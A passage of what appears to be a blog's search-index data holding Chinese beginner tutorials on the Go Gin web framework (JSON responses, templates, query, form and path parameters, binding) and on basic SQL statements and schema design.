r.LoadHTMLFiles(\"hello.tmpl\")//加载模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.tmpl\",gin.H{//向模板中传递参数 \"name\": \"zeroy\", \"age\": 18, }) }) r.Run() } 模板文件： \u003c!DOCTYPE html\u003e Document name: {{.name}} age: {{.age}} 由于实际开发中大多采用前后端分离式开发，模板技术的应用范围不大，所以这里不再赘述，有需要直接查文档就好。 Gin框架返回json package main import ( \"github.com/gin-gonic/gin\" \"net/http\" ) func main() { r := gin.Default() r.GET(\"/json\", func(c *gin.Context) { data := gin.H{\"name\":\"zeroy\", \"message\": \"hello world!\", \"age\": 18} c.JSON(http.StatusOK, data) }) type msg struct{ Name string `json:\"name\"`//有时为了方便前端开发，需要为类型名创建别名（反射） Message string Age int } r.GET(\"/another_json\", func(c *gin.Context) { data := msg{ \"zeroy\", \"Hello golang!\", 18, } c.JSON(http.StatusOK, data)//本质是msg的序列化 }) r.Run() } 获取querystring参数querystring参数即URL中?后的参数。 username := c.DefaultQuery(\"username\", \"zeroy\")//若查询不到username则默认值为zeroy address := c.Query(\"address\") 例程：A+B Problem web版 package main import ( \"github.com/gin-gonic/gin\" \"strconv\" ) func main() { r:=gin.Default() r.GET(\"/\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Query(\"a\")) b,_:=strconv.Atoi(c.Query(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 获取form参数 username := c.PostForm(\"username\") address := c.PostForm(\"address\") PostForm方法可以获取Post请求提交的参数。 获取path参数例程：A+B Problem web版（使用path参数传参） func main() { r:=gin.Default() r.GET(\"/:a/:b\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Param(\"a\")) b,_:=strconv.Atoi(c.Param(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 参数绑定ShouldBind方法可以自动化绑定参数到某个struct中。 type People struct{ Name string `form:\"name\"`//设定别名，方便传参 Age int `form:\"age\"` BirthDay string `form:\"birthday\"` } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var zeroy People //传递的name，age，birthday等变量可以自动化绑定到zeroy中 if err := c.ShouldBind(\u0026zeroy); err == nil { c.JSON(http.StatusOK, gin.H{ \"name\":zeroy.Name, \"age\":zeroy.Age, }) } else { c.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()}) } }) r.Run() } 例程：A+B problem with 参数绑定 type Node struct{ X int `form:\"x\"` Y int `form:\"y\"` } func (node Node) sum() int{ return node.X+node.Y } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var tmp Node if err := c.ShouldBind(\u0026tmp); err == nil { c.JSON(http.StatusOK, gin.H{ \"sum\":tmp.sum(), }) } else { c.JSON(http.StatusBadRequest,","date":"2022-02-11","objectID":"/articles/Golang-web1/:0:1","series":null,"tags":null,"title":"Golang|Gin Web development for Beginners","uri":"/articles/Golang-web1/#获取querystring参数"},{"categories":["golang-web"],"content":" Gin框架 简介Gin 是一个用 Go (Golang) 编写的 HTTP web 框架。 它是一个类似于 martini 但拥有更好性能的 API 框架, 优于 httprouter，速度提高了近 40 倍。如果你需要极好的性能，使用 Gin 吧。 官方中文文档 Gin框架介绍及使用 | 李文周的博客 (liwenzhou.com) 特性 Gin v1 稳定的特性: 零分配路由。 仍然是最快的 http 路由器和框架。 完整的单元测试支持。 实战考验。 API 冻结，新版本的发布不会破坏你的代码。 框架初识使用Gin框架返回一个json文件 func sayHello(c *gin.Context/*gin框架中的临时变量，便于后续响应请求*/){ c.JSON(http.StatusOK,gin.H{//返回一个json数据 \"message\":\"HelloWorld\", }) } func main(){ r:=gin.Default()//获取gin框架默认路由对象 r.GET(\"/\",sayHello)//处理向\"/\"目录发起的get请求，并将其使用sayHello函数处理 r.Run() } 项目实践中一般使用匿名函数： r.GET(\"/\",func(c *gin.Context){ c.JSON(http.StatusOK,gin.H{ \"message\":\"HelloWorld\", }) }) 使用Gin框架返回一个html文件 func main(){ r:=gin.Default() r.LoadHTMLFiles(\"hello.html\")//解析模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.html\",gin.H{}) }) r.Run() } 模板渲染template package - html/template - pkg.go.dev Go语言标准库之http/template | 李文周的博客 (liwenzhou.com) 一个简单示例 type User struct { //成员变量名必须为大写，使其可以被外部访问 Name string Gender string Age int } func sayHello(w http.ResponseWriter, r *http.Request){ // 定义模板 // 解析模板 t, _ := template.ParseFiles(\"./hello.tmpl\") // 渲染模板 u1 := User{ // u1.Name Name: \"zeroy\", Gender: \"男\", Age: 18, } m1 := map[string]interface{}{ \"name\": \"zeroy\", \"gender\": \"男\", \"age\": 18, } hobbyList := []string{ \"乒乓球\", \"网球\", \"羽毛球\", } t.Execute(w, map[string]interface{}{ \"u1\": u1, \"m1\": m1, \"hobby\": hobbyList, }) } func main() { http.HandleFunc(\"/\", sayHello) http.ListenAndServe(\":9000\", nil) } 在Gin框架中渲染模板 func main(){ r:=gin.Default() r.LoadHTMLFiles(\"hello.tmpl\")//加载模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.tmpl\",gin.H{//向模板中传递参数 \"name\": \"zeroy\", \"age\": 18, }) }) r.Run() } 模板文件： \u003c!DOCTYPE html\u003e Document name: {{.name}} age: {{.age}} 由于实际开发中大多采用前后端分离式开发，模板技术的应用范围不大，所以这里不再赘述，有需要直接查文档就好。 Gin框架返回json package main import ( \"github.com/gin-gonic/gin\" \"net/http\" ) func main() { r := gin.Default() r.GET(\"/json\", func(c *gin.Context) { data := gin.H{\"name\":\"zeroy\", \"message\": \"hello world!\", \"age\": 18} c.JSON(http.StatusOK, data) }) type msg struct{ Name string `json:\"name\"`//有时为了方便前端开发，需要为类型名创建别名（反射） Message string Age int } r.GET(\"/another_json\", func(c *gin.Context) { data := msg{ \"zeroy\", \"Hello golang!\", 18, } c.JSON(http.StatusOK, data)//本质是msg的序列化 }) r.Run() } 获取querystring参数querystring参数即URL中?后的参数。 username := c.DefaultQuery(\"username\", \"zeroy\")//若查询不到username则默认值为zeroy address := c.Query(\"address\") 例程：A+B Problem web版 package main import ( \"github.com/gin-gonic/gin\" \"strconv\" ) func main() { r:=gin.Default() r.GET(\"/\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Query(\"a\")) b,_:=strconv.Atoi(c.Query(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 获取form参数 username := c.PostForm(\"username\") address := c.PostForm(\"address\") PostForm方法可以获取Post请求提交的参数。 获取path参数例程：A+B Problem web版（使用path参数传参） func main() { r:=gin.Default() r.GET(\"/:a/:b\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Param(\"a\")) b,_:=strconv.Atoi(c.Param(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 参数绑定ShouldBind方法可以自动化绑定参数到某个struct中。 type People struct{ Name string `form:\"name\"`//设定别名，方便传参 Age int `form:\"age\"` BirthDay string `form:\"birthday\"` } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var zeroy People //传递的name，age，birthday等变量可以自动化绑定到zeroy中 if err := c.ShouldBind(\u0026zeroy); err == nil { c.JSON(http.StatusOK, gin.H{ \"name\":zeroy.Name, \"age\":zeroy.Age, }) } else { c.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()}) } }) r.Run() } 例程：A+B problem with 参数绑定 type Node struct{ X int `form:\"x\"` Y int `form:\"y\"` } func (node Node) sum() int{ return node.X+node.Y } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var tmp Node if err := c.ShouldBind(\u0026tmp); err == nil { c.JSON(http.StatusOK, gin.H{ \"sum\":tmp.sum(), }) } else { c.JSON(http.StatusBadRequest,","date":"2022-02-11","objectID":"/articles/Golang-web1/:0:1","series":null,"tags":null,"title":"Golang|Gin Web development for Beginners","uri":"/articles/Golang-web1/#获取form参数"},{"categories":["golang-web"],"content":" Gin框架 简介Gin 是一个用 Go (Golang) 编写的 HTTP web 框架。 它是一个类似于 martini 但拥有更好性能的 API 框架, 优于 httprouter，速度提高了近 40 倍。如果你需要极好的性能，使用 Gin 吧。 官方中文文档 Gin框架介绍及使用 | 李文周的博客 (liwenzhou.com) 特性 Gin v1 稳定的特性: 零分配路由。 仍然是最快的 http 路由器和框架。 完整的单元测试支持。 实战考验。 API 冻结，新版本的发布不会破坏你的代码。 框架初识使用Gin框架返回一个json文件 func sayHello(c *gin.Context/*gin框架中的临时变量，便于后续响应请求*/){ c.JSON(http.StatusOK,gin.H{//返回一个json数据 \"message\":\"HelloWorld\", }) } func main(){ r:=gin.Default()//获取gin框架默认路由对象 r.GET(\"/\",sayHello)//处理向\"/\"目录发起的get请求，并将其使用sayHello函数处理 r.Run() } 项目实践中一般使用匿名函数： r.GET(\"/\",func(c *gin.Context){ c.JSON(http.StatusOK,gin.H{ \"message\":\"HelloWorld\", }) }) 使用Gin框架返回一个html文件 func main(){ r:=gin.Default() r.LoadHTMLFiles(\"hello.html\")//解析模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.html\",gin.H{}) }) r.Run() } 模板渲染template package - html/template - pkg.go.dev Go语言标准库之http/template | 李文周的博客 (liwenzhou.com) 一个简单示例 type User struct { //成员变量名必须为大写，使其可以被外部访问 Name string Gender string Age int } func sayHello(w http.ResponseWriter, r *http.Request){ // 定义模板 // 解析模板 t, _ := template.ParseFiles(\"./hello.tmpl\") // 渲染模板 u1 := User{ // u1.Name Name: \"zeroy\", Gender: \"男\", Age: 18, } m1 := map[string]interface{}{ \"name\": \"zeroy\", \"gender\": \"男\", \"age\": 18, } hobbyList := []string{ \"乒乓球\", \"网球\", \"羽毛球\", } t.Execute(w, map[string]interface{}{ \"u1\": u1, \"m1\": m1, \"hobby\": hobbyList, }) } func main() { http.HandleFunc(\"/\", sayHello) http.ListenAndServe(\":9000\", nil) } 在Gin框架中渲染模板 func main(){ r:=gin.Default() r.LoadHTMLFiles(\"hello.tmpl\")//加载模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.tmpl\",gin.H{//向模板中传递参数 \"name\": \"zeroy\", \"age\": 18, }) }) r.Run() } 模板文件： \u003c!DOCTYPE html\u003e Document name: {{.name}} age: {{.age}} 由于实际开发中大多采用前后端分离式开发，模板技术的应用范围不大，所以这里不再赘述，有需要直接查文档就好。 Gin框架返回json package main import ( \"github.com/gin-gonic/gin\" \"net/http\" ) func main() { r := gin.Default() r.GET(\"/json\", func(c *gin.Context) { data := gin.H{\"name\":\"zeroy\", \"message\": \"hello world!\", \"age\": 18} c.JSON(http.StatusOK, data) }) type msg struct{ Name string `json:\"name\"`//有时为了方便前端开发，需要为类型名创建别名（反射） Message string Age int } r.GET(\"/another_json\", func(c *gin.Context) { data := msg{ \"zeroy\", \"Hello golang!\", 18, } c.JSON(http.StatusOK, data)//本质是msg的序列化 }) r.Run() } 获取querystring参数querystring参数即URL中?后的参数。 username := c.DefaultQuery(\"username\", \"zeroy\")//若查询不到username则默认值为zeroy address := c.Query(\"address\") 例程：A+B Problem web版 package main import ( \"github.com/gin-gonic/gin\" \"strconv\" ) func main() { r:=gin.Default() r.GET(\"/\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Query(\"a\")) b,_:=strconv.Atoi(c.Query(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 获取form参数 username := c.PostForm(\"username\") address := c.PostForm(\"address\") PostForm方法可以获取Post请求提交的参数。 获取path参数例程：A+B Problem web版（使用path参数传参） func main() { r:=gin.Default() r.GET(\"/:a/:b\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Param(\"a\")) b,_:=strconv.Atoi(c.Param(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 参数绑定ShouldBind方法可以自动化绑定参数到某个struct中。 type People struct{ Name string `form:\"name\"`//设定别名，方便传参 Age int `form:\"age\"` BirthDay string `form:\"birthday\"` } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var zeroy People //传递的name，age，birthday等变量可以自动化绑定到zeroy中 if err := c.ShouldBind(\u0026zeroy); err == nil { c.JSON(http.StatusOK, gin.H{ \"name\":zeroy.Name, \"age\":zeroy.Age, }) } else { c.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()}) } }) r.Run() } 例程：A+B problem with 参数绑定 type Node struct{ X int `form:\"x\"` Y int `form:\"y\"` } func (node Node) sum() int{ return node.X+node.Y } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var tmp Node if err := c.ShouldBind(\u0026tmp); err == nil { c.JSON(http.StatusOK, gin.H{ \"sum\":tmp.sum(), }) } else { c.JSON(http.StatusBadRequest,","date":"2022-02-11","objectID":"/articles/Golang-web1/:0:1","series":null,"tags":null,"title":"Golang|Gin Web development for Beginners","uri":"/articles/Golang-web1/#获取path参数"},{"categories":["golang-web"],"content":" Gin框架 简介Gin 是一个用 Go (Golang) 编写的 HTTP web 框架。 它是一个类似于 martini 但拥有更好性能的 API 框架, 优于 httprouter，速度提高了近 40 倍。如果你需要极好的性能，使用 Gin 吧。 官方中文文档 Gin框架介绍及使用 | 李文周的博客 (liwenzhou.com) 特性 Gin v1 稳定的特性: 零分配路由。 仍然是最快的 http 路由器和框架。 完整的单元测试支持。 实战考验。 API 冻结，新版本的发布不会破坏你的代码。 框架初识使用Gin框架返回一个json文件 func sayHello(c *gin.Context/*gin框架中的临时变量，便于后续响应请求*/){ c.JSON(http.StatusOK,gin.H{//返回一个json数据 \"message\":\"HelloWorld\", }) } func main(){ r:=gin.Default()//获取gin框架默认路由对象 r.GET(\"/\",sayHello)//处理向\"/\"目录发起的get请求，并将其使用sayHello函数处理 r.Run() } 项目实践中一般使用匿名函数： r.GET(\"/\",func(c *gin.Context){ c.JSON(http.StatusOK,gin.H{ \"message\":\"HelloWorld\", }) }) 使用Gin框架返回一个html文件 func main(){ r:=gin.Default() r.LoadHTMLFiles(\"hello.html\")//解析模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.html\",gin.H{}) }) r.Run() } 模板渲染template package - html/template - pkg.go.dev Go语言标准库之http/template | 李文周的博客 (liwenzhou.com) 一个简单示例 type User struct { //成员变量名必须为大写，使其可以被外部访问 Name string Gender string Age int } func sayHello(w http.ResponseWriter, r *http.Request){ // 定义模板 // 解析模板 t, _ := template.ParseFiles(\"./hello.tmpl\") // 渲染模板 u1 := User{ // u1.Name Name: \"zeroy\", Gender: \"男\", Age: 18, } m1 := map[string]interface{}{ \"name\": \"zeroy\", \"gender\": \"男\", \"age\": 18, } hobbyList := []string{ \"乒乓球\", \"网球\", \"羽毛球\", } t.Execute(w, map[string]interface{}{ \"u1\": u1, \"m1\": m1, \"hobby\": hobbyList, }) } func main() { http.HandleFunc(\"/\", sayHello) http.ListenAndServe(\":9000\", nil) } 在Gin框架中渲染模板 func main(){ r:=gin.Default() r.LoadHTMLFiles(\"hello.tmpl\")//加载模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.tmpl\",gin.H{//向模板中传递参数 \"name\": \"zeroy\", \"age\": 18, }) }) r.Run() } 模板文件： \u003c!DOCTYPE html\u003e Document name: {{.name}} age: {{.age}} 由于实际开发中大多采用前后端分离式开发，模板技术的应用范围不大，所以这里不再赘述，有需要直接查文档就好。 Gin框架返回json package main import ( \"github.com/gin-gonic/gin\" \"net/http\" ) func main() { r := gin.Default() r.GET(\"/json\", func(c *gin.Context) { data := gin.H{\"name\":\"zeroy\", \"message\": \"hello world!\", \"age\": 18} c.JSON(http.StatusOK, data) }) type msg struct{ Name string `json:\"name\"`//有时为了方便前端开发，需要为类型名创建别名（反射） Message string Age int } r.GET(\"/another_json\", func(c *gin.Context) { data := msg{ \"zeroy\", \"Hello golang!\", 18, } c.JSON(http.StatusOK, data)//本质是msg的序列化 }) r.Run() } 获取querystring参数querystring参数即URL中?后的参数。 username := c.DefaultQuery(\"username\", \"zeroy\")//若查询不到username则默认值为zeroy address := c.Query(\"address\") 例程：A+B Problem web版 package main import ( \"github.com/gin-gonic/gin\" \"strconv\" ) func main() { r:=gin.Default() r.GET(\"/\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Query(\"a\")) b,_:=strconv.Atoi(c.Query(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 获取form参数 username := c.PostForm(\"username\") address := c.PostForm(\"address\") PostForm方法可以获取Post请求提交的参数。 获取path参数例程：A+B Problem web版（使用path参数传参） func main() { r:=gin.Default() r.GET(\"/:a/:b\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Param(\"a\")) b,_:=strconv.Atoi(c.Param(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 参数绑定ShouldBind方法可以自动化绑定参数到某个struct中。 type People struct{ Name string `form:\"name\"`//设定别名，方便传参 Age int `form:\"age\"` BirthDay string `form:\"birthday\"` } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var zeroy People //传递的name，age，birthday等变量可以自动化绑定到zeroy中 if err := c.ShouldBind(\u0026zeroy); err == nil { c.JSON(http.StatusOK, gin.H{ \"name\":zeroy.Name, \"age\":zeroy.Age, }) } else { c.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()}) } }) r.Run() } 例程：A+B problem with 参数绑定 type Node struct{ X int `form:\"x\"` Y int `form:\"y\"` } func (node Node) sum() int{ return node.X+node.Y } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var tmp Node if err := c.ShouldBind(\u0026tmp); err == nil { c.JSON(http.StatusOK, gin.H{ \"sum\":tmp.sum(), }) } else { c.JSON(http.StatusBadRequest,","date":"2022-02-11","objectID":"/articles/Golang-web1/:0:1","series":null,"tags":null,"title":"Golang|Gin Web development for Beginners","uri":"/articles/Golang-web1/#参数绑定"},{"categories":["golang-web"],"content":" Gin框架 简介Gin 是一个用 Go (Golang) 编写的 HTTP web 框架。 它是一个类似于 martini 但拥有更好性能的 API 框架, 优于 httprouter，速度提高了近 40 倍。如果你需要极好的性能，使用 Gin 吧。 官方中文文档 Gin框架介绍及使用 | 李文周的博客 (liwenzhou.com) 特性 Gin v1 稳定的特性: 零分配路由。 仍然是最快的 http 路由器和框架。 完整的单元测试支持。 实战考验。 API 冻结，新版本的发布不会破坏你的代码。 框架初识使用Gin框架返回一个json文件 func sayHello(c *gin.Context/*gin框架中的临时变量，便于后续响应请求*/){ c.JSON(http.StatusOK,gin.H{//返回一个json数据 \"message\":\"HelloWorld\", }) } func main(){ r:=gin.Default()//获取gin框架默认路由对象 r.GET(\"/\",sayHello)//处理向\"/\"目录发起的get请求，并将其使用sayHello函数处理 r.Run() } 项目实践中一般使用匿名函数： r.GET(\"/\",func(c *gin.Context){ c.JSON(http.StatusOK,gin.H{ \"message\":\"HelloWorld\", }) }) 使用Gin框架返回一个html文件 func main(){ r:=gin.Default() r.LoadHTMLFiles(\"hello.html\")//解析模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.html\",gin.H{}) }) r.Run() } 模板渲染template package - html/template - pkg.go.dev Go语言标准库之http/template | 李文周的博客 (liwenzhou.com) 一个简单示例 type User struct { //成员变量名必须为大写，使其可以被外部访问 Name string Gender string Age int } func sayHello(w http.ResponseWriter, r *http.Request){ // 定义模板 // 解析模板 t, _ := template.ParseFiles(\"./hello.tmpl\") // 渲染模板 u1 := User{ // u1.Name Name: \"zeroy\", Gender: \"男\", Age: 18, } m1 := map[string]interface{}{ \"name\": \"zeroy\", \"gender\": \"男\", \"age\": 18, } hobbyList := []string{ \"乒乓球\", \"网球\", \"羽毛球\", } t.Execute(w, map[string]interface{}{ \"u1\": u1, \"m1\": m1, \"hobby\": hobbyList, }) } func main() { http.HandleFunc(\"/\", sayHello) http.ListenAndServe(\":9000\", nil) } 在Gin框架中渲染模板 func main(){ r:=gin.Default() r.LoadHTMLFiles(\"hello.tmpl\")//加载模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.tmpl\",gin.H{//向模板中传递参数 \"name\": \"zeroy\", \"age\": 18, }) }) r.Run() } 模板文件： \u003c!DOCTYPE html\u003e Document name: {{.name}} age: {{.age}} 由于实际开发中大多采用前后端分离式开发，模板技术的应用范围不大，所以这里不再赘述，有需要直接查文档就好。 Gin框架返回json package main import ( \"github.com/gin-gonic/gin\" \"net/http\" ) func main() { r := gin.Default() r.GET(\"/json\", func(c *gin.Context) { data := gin.H{\"name\":\"zeroy\", \"message\": \"hello world!\", \"age\": 18} c.JSON(http.StatusOK, data) }) type msg struct{ Name string `json:\"name\"`//有时为了方便前端开发，需要为类型名创建别名（反射） Message string Age int } r.GET(\"/another_json\", func(c *gin.Context) { data := msg{ \"zeroy\", \"Hello golang!\", 18, } c.JSON(http.StatusOK, data)//本质是msg的序列化 }) r.Run() } 获取querystring参数querystring参数即URL中?后的参数。 username := c.DefaultQuery(\"username\", \"zeroy\")//若查询不到username则默认值为zeroy address := c.Query(\"address\") 例程：A+B Problem web版 package main import ( \"github.com/gin-gonic/gin\" \"strconv\" ) func main() { r:=gin.Default() r.GET(\"/\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Query(\"a\")) b,_:=strconv.Atoi(c.Query(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 获取form参数 username := c.PostForm(\"username\") address := c.PostForm(\"address\") PostForm方法可以获取Post请求提交的参数。 获取path参数例程：A+B Problem web版（使用path参数传参） func main() { r:=gin.Default() r.GET(\"/:a/:b\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Param(\"a\")) b,_:=strconv.Atoi(c.Param(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 参数绑定ShouldBind方法可以自动化绑定参数到某个struct中。 type People struct{ Name string `form:\"name\"`//设定别名，方便传参 Age int `form:\"age\"` BirthDay string `form:\"birthday\"` } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var zeroy People //传递的name，age，birthday等变量可以自动化绑定到zeroy中 if err := c.ShouldBind(\u0026zeroy); err == nil { c.JSON(http.StatusOK, gin.H{ \"name\":zeroy.Name, \"age\":zeroy.Age, }) } else { c.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()}) } }) r.Run() } 例程：A+B problem with 参数绑定 type Node struct{ X int `form:\"x\"` Y int `form:\"y\"` } func (node Node) sum() int{ return node.X+node.Y } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var tmp Node if err := c.ShouldBind(\u0026tmp); err == nil { c.JSON(http.StatusOK, gin.H{ \"sum\":tmp.sum(), }) } else { c.JSON(http.StatusBadRequest,","date":"2022-02-11","objectID":"/articles/Golang-web1/:0:1","series":null,"tags":null,"title":"Golang|Gin Web development for Beginners","uri":"/articles/Golang-web1/#文件上传"},{"categories":["golang-web"],"content":" 总结掌握了Gin框架的基本操作，我们便有能力搭建一个最最基本的web服务，处理来自用户端的请求。 但是如果要搭建一个真正实用的服务器后端，还需要与本地的数据库进行交互（database/sql，GORM），进行复杂的鉴权操作。 之后可能会看看数据库交互和一些中间件，实现鉴权和与本地数据库交互。 ","date":"2022-02-11","objectID":"/articles/Golang-web1/:0:2","series":null,"tags":null,"title":"Golang|Gin Web development for Beginners","uri":"/articles/Golang-web1/#总结"},{"categories":["DATABASE"],"content":" 数据库基础 增新建数据库 CREATE DATABASE {{name}} 新建数据表 CREATE TABLE {{name}}( {{列名}} {{数据类型}} {{约束}}, ..... ); EXAMPLE: CREATE TABLE Users( id int primary key, name varchar(30) NOT NULL, birthday date, score int NOT NULL ); 添加外键约束 建表时添加 CONSTRAINT {{键名}} FOREIGN KEY({{当前表列名}}) REFERENCES {{别的表(别的表列名)}} 建表后添加 alter table {{表名}} add CONSTRAINT {{键名}} FOREIGN KEY({{当前表列名}}) REFERENCES {{别的表(别的表列名)}} 插入元素 EXAMPLE: 向一张名为users的数据表中插入元素： INSERT INTO users(id,name,birthday,score) VALUES (1,'zeroy','2003-4-10',100) , (2,'admin','2003-4-10',99) 查 SELECT {{列名}} FROM {{表名}} WHERE {{条件}} GROUP BY {{分组字段}} HAVING {{分组后条件}} ORDER BY {{排序字段}} LIMIT {{分页限定}} 改 UPDATE {{表名}} set {{程序语句}} WHERE {{条件}} 事务事务能实现多条命令捆绑，一旦失败，会回滚所有操作。 -- 开启事务 BEGIN; -- 回滚事务 ROLLBACK; -- 提交事务 COMMIT; 数据库设计一对多 如博客系统一个用户对应多篇文章，需要在文章表处引一条外键连向数据表。 多对多 如购物系统中一个商品对应多个订单，一个订单也被多个商品所共有。 实现方式：新建一张表引出两条外键分别连向商品表和订单表的主键，这张数据表的一行代表一件商品与一张订单之间的关系。 一对一 用于表拆分，提升常用信息的访问速度。 ","date":"2022-02-07","objectID":"/articles/database-for-beginner/:0:1","series":null,"tags":null,"title":"数据库基础|JDBC入门|Druid连接池的简单配置","uri":"/articles/database-for-beginner/#数据库基础"},{"categories":["DATABASE"],"content":" 数据库基础 增新建数据库 CREATE DATABASE {{name}} 新建数据表 CREATE TABLE {{name}}( {{列名}} {{数据类型}} {{约束}}, ..... ); EXAMPLE: CREATE TABLE Users( id int primary key, name varchar(30) NOT NULL, birthday date, score int NOT NULL ); 添加外键约束 建表时添加 CONSTRAINT {{键名}} FOREIGN KEY({{当前表列名}}) REFERENCES {{别的表(别的表列名)}} 建表后添加 alter table {{表名}} add CONSTRAINT {{键名}} FOREIGN KEY({{当前表列名}}) REFERENCES {{别的表(别的表列名)}} 插入元素 EXAMPLE: 向一张名为users的数据表中插入元素： INSERT INTO users(id,name,birthday,score) VALUES (1,'zeroy','2003-4-10',100) , (2,'admin','2003-4-10',99) 查 SELECT {{列名}} FROM {{表名}} WHERE {{条件}} GROUP BY {{分组字段}} HAVING {{分组后条件}} ORDER BY {{排序字段}} LIMIT {{分页限定}} 改 UPDATE {{表名}} set {{程序语句}} WHERE {{条件}} 事务事务能实现多条命令捆绑，一旦失败，会回滚所有操作。 -- 开启事务 BEGIN; -- 回滚事务 ROLLBACK; -- 提交事务 COMMIT; 数据库设计一对多 如博客系统一个用户对应多篇文章，需要在文章表处引一条外键连向数据表。 多对多 如购物系统中一个商品对应多个订单，一个订单也被多个商品所共有。 实现方式：新建一张表引出两条外键分别连向商品表和订单表的主键，这张数据表的一行代表一件商品与一张订单之间的关系。 一对一 用于表拆分，提升常用信息的访问速度。 ","date":"2022-02-07","objectID":"/articles/database-for-beginner/:0:1","series":null,"tags":null,"title":"数据库基础|JDBC入门|Druid连接池的简单配置","uri":"/articles/database-for-beginner/#增"},{"categories":["DATABASE"],"content":" 数据库基础 增新建数据库 CREATE DATABASE {{name}} 新建数据表 CREATE TABLE {{name}}( {{列名}} {{数据类型}} {{约束}}, ..... ); EXAMPLE: CREATE TABLE Users( id int primary key, name varchar(30) NOT NULL, birthday date, score int NOT NULL ); 添加外键约束 建表时添加 CONSTRAINT {{键名}} FOREIGN KEY({{当前表列名}}) REFERENCES {{别的表(别的表列名)}} 建表后添加 alter table {{表名}} add CONSTRAINT {{键名}} FOREIGN KEY({{当前表列名}}) REFERENCES {{别的表(别的表列名)}} 插入元素 EXAMPLE: 向一张名为users的数据表中插入元素： INSERT INTO users(id,name,birthday,score) VALUES (1,'zeroy','2003-4-10',100) , (2,'admin','2003-4-10',99) 查 SELECT {{列名}} FROM {{表名}} WHERE {{条件}} GROUP BY {{分组字段}} HAVING {{分组后条件}} ORDER BY {{排序字段}} LIMIT {{分页限定}} 改 UPDATE {{表名}} set {{程序语句}} WHERE {{条件}} 事务事务能实现多条命令捆绑，一旦失败，会回滚所有操作。 -- 开启事务 BEGIN; -- 回滚事务 ROLLBACK; -- 提交事务 COMMIT; 数据库设计一对多 如博客系统一个用户对应多篇文章，需要在文章表处引一条外键连向数据表。 多对多 如购物系统中一个商品对应多个订单，一个订单也被多个商品所共有。 实现方式：新建一张表引出两条外键分别连向商品表和订单表的主键，这张数据表的一行代表一件商品与一张订单之间的关系。 一对一 用于表拆分，提升常用信息的访问速度。 ","date":"2022-02-07","objectID":"/articles/database-for-beginner/:0:1","series":null,"tags":null,"title":"数据库基础|JDBC入门|Druid连接池的简单配置","uri":"/articles/database-for-beginner/#查"},{"categories":["DATABASE"],"content":" 数据库基础 增新建数据库 CREATE DATABASE {{name}} 新建数据表 CREATE TABLE {{name}}( {{列名}} {{数据类型}} {{约束}}, ..... ); EXAMPLE: CREATE TABLE Users( id int primary key, name varchar(30) NOT NULL, birthday date, score int NOT NULL ); 添加外键约束 建表时添加 CONSTRAINT {{键名}} FOREIGN KEY({{当前表列名}}) REFERENCES {{别的表(别的表列名)}} 建表后添加 alter table {{表名}} add CONSTRAINT {{键名}} FOREIGN KEY({{当前表列名}}) REFERENCES {{别的表(别的表列名)}} 插入元素 EXAMPLE: 向一张名为users的数据表中插入元素： INSERT INTO users(id,name,birthday,score) VALUES (1,'zeroy','2003-4-10',100) , (2,'admin','2003-4-10',99) 查 SELECT {{列名}} FROM {{表名}} WHERE {{条件}} GROUP BY {{分组字段}} HAVING {{分组后条件}} ORDER BY {{排序字段}} LIMIT {{分页限定}} 改 UPDATE {{表名}} set {{程序语句}} WHERE {{条件}} 事务事务能实现多条命令捆绑，一旦失败，会回滚所有操作。 -- 开启事务 BEGIN; -- 回滚事务 ROLLBACK; -- 提交事务 COMMIT; 数据库设计一对多 如博客系统一个用户对应多篇文章，需要在文章表处引一条外键连向数据表。 多对多 如购物系统中一个商品对应多个订单，一个订单也被多个商品所共有。 